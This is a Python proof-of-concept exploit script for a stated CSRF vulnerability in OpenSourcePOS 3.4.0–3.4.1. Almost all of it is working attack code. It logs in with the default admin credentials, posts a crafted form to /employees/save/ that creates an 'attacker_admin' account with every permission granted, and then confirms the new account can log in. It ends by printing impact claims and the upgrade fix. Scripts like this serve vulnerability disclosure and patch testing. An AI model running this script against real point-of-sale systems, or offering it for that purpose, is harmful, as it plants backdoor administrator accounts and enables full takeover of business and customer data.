#!/usr/bin/env python3
"""
CVE-2025-68434 - OpenSourcePOS CSRF Vulnerability PoC
Affected versions: 3.4.0 - 3.4.1
The CSRF protection was explicitly disabled in app/Config/Filters.php
"""

import requests
import sys
import re

TARGET_URL = "http://localhost:8080"
ADMIN_USER = "admin"
ADMIN_PASS = "pointofsale"

ATTACKER_USER = "attacker_admin"
ATTACKER_PASS = "P@ssw0rd123"


def get_login_token(session):
    resp = session.get(f"{TARGET_URL}/login", timeout=10)
    match = re.search(r'name="csrf_ospos_token"\s+value="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None


def admin_login(session):
    print("[*] Logging in as admin...")
    login_url = f"{TARGET_URL}/login"
    
    token = get_login_token(session)
    
    login_data = {
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
    }
    if token:
        login_data["csrf_ospos_token"] = token
    
    resp = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
    
    if "home" in resp.url.lower() or "login" not in resp.url.lower():
        print("[+] Admin login successful")
        return True
    
    print(f"[-] Login failed. Response URL: {resp.url}")
    return False


def exploit_csrf_create_admin(session):
    print("[*] Exploiting CSRF to create new admin account...")
    print(f"    Target: POST /employees/save/")
    print(f"    New user: {ATTACKER_USER}")
    
    payload = {
        "first_name": "CSRF",
        "last_name": "Attacker",
        "email": "attacker@evil.com",
        "phone_number": "1234567890",
        "username": ATTACKER_USER,
        "password": ATTACKER_PASS,
        "gender": "0",
        "language": "en:english",
        "address_1": "",
        "address_2": "",
        "city": "",
        "state": "",
        "zip": "",
        "country": "",
        "comments": "",
        "grant_config": "config",
        "menu_group_config": "home",
        "grant_employees": "employees",
        "menu_group_employees": "home",
        "grant_customers": "customers",
        "menu_group_customers": "home",
        "grant_items": "items",
        "menu_group_items": "home",
        "grant_sales": "sales",
        "menu_group_sales": "home",
        "grant_reports": "reports",
        "menu_group_reports": "home",
    }
    
    resp = session.post(
        f"{TARGET_URL}/employees/save/",
        data=payload,
        timeout=30,
        allow_redirects=True
    )
    
    print(f"    Response status: {resp.status_code}")
    
    if resp.status_code == 200:
        try:
            resp_json = resp.json()
            if resp_json.get("success"):
                print(f"[+] Employee created successfully!")
                print(f"    Message: {resp_json.get('message')}")
                print(f"    Person ID: {resp_json.get('id')}")
                return True
        except:
            pass
        
        if '"success":true' in resp.text:
            print("[+] Employee created successfully!")
            return True
    
    print(f"[-] Failed to create employee: {resp.text[:200]}")
    return False


def verify_new_admin():
    print("[*] Verifying new admin account can login...")
    
    new_session = requests.Session()
    token = get_login_token(new_session)
    
    login_data = {
        "username": ATTACKER_USER,
        "password": ATTACKER_PASS,
    }
    if token:
        login_data["csrf_ospos_token"] = token
    
    resp = new_session.post(
        f"{TARGET_URL}/login",
        data=login_data,
        timeout=10,
        allow_redirects=True
    )
    
    if "home" in resp.url.lower() or "login" not in resp.url.lower():
        print(f"[+] New admin '{ATTACKER_USER}' login successful!")
        return True
    
    print(f"[-] New admin login failed")
    return False


def verify_csrf_disabled(session):
    print("[*] Verifying CSRF protection is disabled...")
    
    payload = {"test": "value"}
    resp = session.post(
        f"{TARGET_URL}/employees/save/",
        data=payload,
        timeout=10
    )
    
    if "csrf" not in resp.text.lower() or resp.status_code != 403:
        print("[+] CSRF protection is DISABLED - no CSRF token rejection")
        return True
    
    print("[-] CSRF protection appears to be enabled")
    return False


def main():
    print("=" * 60)
    print("CVE-2025-68434 - OpenSourcePOS CSRF Vulnerability PoC")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Affected: OSPOS 3.4.0 - 3.4.1")
    print(f"Root cause: CSRF filter disabled in app/Config/Filters.php")
    print("=" * 60)
    print()
    
    session = requests.Session()
    
    try:
        resp = session.get(f"{TARGET_URL}/login", timeout=10)
        if resp.status_code != 200:
            print(f"[-] Target not reachable: {resp.status_code}")
            return False
        print("[+] Target is reachable")
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False
    
    if not admin_login(session):
        print("[-] Failed to login as admin")
        return False
    
    csrf_disabled = verify_csrf_disabled(session)
    
    if exploit_csrf_create_admin(session):
        print()
        print("=" * 60)
        print("[+] VULNERABLE - CVE-2025-68434 CSRF Exploitation Successful!")
        print("=" * 60)
        print()
        print("Evidence:")
        print(f"  - CSRF protection disabled: {'Yes' if csrf_disabled else 'Unknown'}")
        print(f"  - Created admin account: {ATTACKER_USER}")
        print(f"  - Password: {ATTACKER_PASS}")
        print()
        print("Impact:")
        print("  - Attacker can create admin accounts without CSRF token")
        print("  - Full system takeover possible")
        print("  - Complete loss of confidentiality, integrity, availability")
        print()
        print("Vulnerable code: app/Config/Filters.php line 73")
        print("  // 'csrf' => ['except' => 'login'],")
        print()
        print("Fix: Upgrade to version 3.4.2+")
        print("=" * 60)
        
        if verify_new_admin():
            print("[+] Verification: New admin can login successfully")
        
        return True
    else:
        print()
        print("[-] Exploitation unsuccessful or target may be patched")
        return False


if __name__ == "__main__":
    result = main()
    sys.exit(0 if result else 1)
